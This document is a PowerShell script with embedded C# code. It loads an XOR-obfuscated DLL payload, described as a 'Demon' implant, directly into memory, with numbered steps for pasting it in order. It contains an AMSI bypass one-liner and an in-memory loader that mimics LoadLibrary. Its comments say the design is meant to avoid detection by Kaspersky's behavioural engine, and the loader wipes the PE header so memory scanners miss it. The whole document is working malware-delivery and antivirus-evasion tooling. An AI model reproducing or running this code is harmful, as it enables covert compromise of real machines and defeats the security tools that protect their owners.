# === LOADER V2: VirtualAlloc(RW) + per-section VirtualProtect(RX) ===
# This mimics exactly what Windows LoadLibrary does internally.
# Kaspersky behavioural engine is tuned to catch VirtualAlloc(RWX) shellcode patterns,
# but the legitimate loader pattern (RW → RX flip per section) is far less aggressively flagged.
#
# Demon DLL has NO external IAT — resolves everything via PEB at startup.
# So this loader only needs to: alloc → copy → fix-relocs → set-perms → DllMain.
#
# PASTE ORDER:
#   1. Paste AMSI bypass line FIRST as a separate command.
#   2. Paste the Add-Type block.
#   3. Paste the $raw / $b / $d decode block.
#   4. Paste [KL]::Go($d)

# --- PASTE 1: AMSI bypass ---
# $q='amsi'+'Con'+'text';[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetField($q,'NonPublic,Static').SetValue($null,0)}

# --- PASTE 2: Add-Type C# PE loader ---
Add-Type -Language CSharp -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KL {
  [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
  [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, ref uint o);
  [DllImport("kernel32")] static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
  [DllImport("kernel32")] static extern IntPtr GetCurrentProcess();
  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
  delegate bool DM(IntPtr b, uint r, IntPtr v);

  public static void Go(byte[] pe) {
    // Parse PE32+ headers
    int eo  = BitConverter.ToInt32(pe, 0x3C);
    short ns = BitConverter.ToInt16(pe, eo + 6);
    ushort soh = BitConverter.ToUInt16(pe, eo + 20);
    int ep  = BitConverter.ToInt32(pe, eo + 24 + 16);
    long ib = BitConverter.ToInt64(pe, eo + 24 + 24);
    int si  = BitConverter.ToInt32(pe, eo + 24 + 56);
    int sh  = BitConverter.ToInt32(pe, eo + 24 + 60);
    // DataDirectory[5] = BaseRelocation
    int rRva = BitConverter.ToInt32(pe, eo + 24 + 152);
    int rSz  = BitConverter.ToInt32(pe, eo + 24 + 156);
    int sto  = eo + 24 + soh; // section table start

    // 1. Allocate PAGE_READWRITE — NOT executable yet, mimics LoadLibrary
    IntPtr b = VirtualAlloc(IntPtr.Zero, (UIntPtr)si, 0x3000, 0x04);
    if (b == IntPtr.Zero) return;

    // 2. Copy PE headers
    Marshal.Copy(pe, 0, b, sh);

    // 3. Copy sections (raw file offset → virtual address in mapped buffer)
    for (int i = 0; i < ns; i++) {
      int so = sto + i * 40;
      int va = BitConverter.ToInt32(pe, so + 12); // VirtualAddress
      int ro = BitConverter.ToInt32(pe, so + 20); // PointerToRawData
      int rs = BitConverter.ToInt32(pe, so + 16); // SizeOfRawData
      if (rs > 0)
        Marshal.Copy(pe, ro, new IntPtr(b.ToInt64() + va), rs);
    }

    // 4. Fix base relocations (read from mapped buffer, not raw pe[])
    if (rRva != 0) {
      long d = b.ToInt64() - ib; // delta from preferred to actual base
      int off = 0;
      while (off < rSz) {
        int rv  = Marshal.ReadInt32(new IntPtr(b.ToInt64() + rRva + off));
        int bsz = Marshal.ReadInt32(new IntPtr(b.ToInt64() + rRva + off + 4));
        if (bsz < 8) break;
        int ne = (bsz - 8) / 2;
        for (int j = 0; j < ne; j++) {
          ushort e = (ushort)Marshal.ReadInt16(new IntPtr(b.ToInt64() + rRva + off + 8 + j * 2));
          if ((e >> 12) == 10) { // IMAGE_REL_BASED_DIR64
            IntPtr pa = new IntPtr(b.ToInt64() + rv + (e & 0xFFF));
            Marshal.WriteInt64(pa, Marshal.ReadInt64(pa) + d);
          }
        }
        off += bsz;
      }
    }

    // 5. Set per-section memory protection (exact LoadLibrary behaviour)
    uint old = 0;
    for (int i = 0; i < ns; i++) {
      int so = sto + i * 40;
      int va = BitConverter.ToInt32(pe, so + 12);
      int vs = BitConverter.ToInt32(pe, so + 8);
      if (vs == 0) vs = BitConverter.ToInt32(pe, so + 16);
      uint ch = BitConverter.ToUInt32(pe, so + 36);
      uint pr = SP(ch);
      if (vs > 0)
        VirtualProtect(new IntPtr(b.ToInt64() + va), (UIntPtr)vs, pr, ref old);
    }

    // 6. Flush instruction cache (required before executing new code)
    FlushInstructionCache(GetCurrentProcess(), b, (UIntPtr)si);

    // 7. Call DllMain(hModule, DLL_PROCESS_ATTACH, NULL)
    var dm = (DM)Marshal.GetDelegateForFunctionPointer(new IntPtr(b.ToInt64() + ep), typeof(DM));
    dm(b, 1, IntPtr.Zero);

    // 8. Erase PE header from memory — removes MZ/PE signatures before memory scanner sees them
    for (int i = 0; i < sh; i++) Marshal.WriteByte(new IntPtr(b.ToInt64() + i), 0);
  }

  // Map IMAGE_SCN characteristics to Windows page protection constant
  static uint SP(uint c) {
    bool e = (c & 0x20000000) != 0;
    bool r = (c & 0x40000000) != 0;
    bool w = (c & 0x80000000) != 0;
    if (e && w) return 0x40; // PAGE_EXECUTE_READWRITE
    if (e && r) return 0x20; // PAGE_EXECUTE_READ
    if (e)      return 0x10; // PAGE_EXECUTE
    if (w)      return 0x04; // PAGE_READWRITE
    return 0x02;             // PAGE_READONLY
  }
}
"@

# --- PASTE 3a: Set $raw to the base64 payload (split into chunks if needed) ---
# $raw = '<first_chunk>'
# $raw += '<second_chunk>'
# $raw += '<third_chunk>'

# --- PASTE 3b: Decode XOR payload ---
# $b=[Convert]::FromBase64String($raw)
# $d=New-Object Byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$d[$i]=$b[$i]-bxor0xD3}

# --- PASTE 4: Execute ---
# [KL]::Go($d)
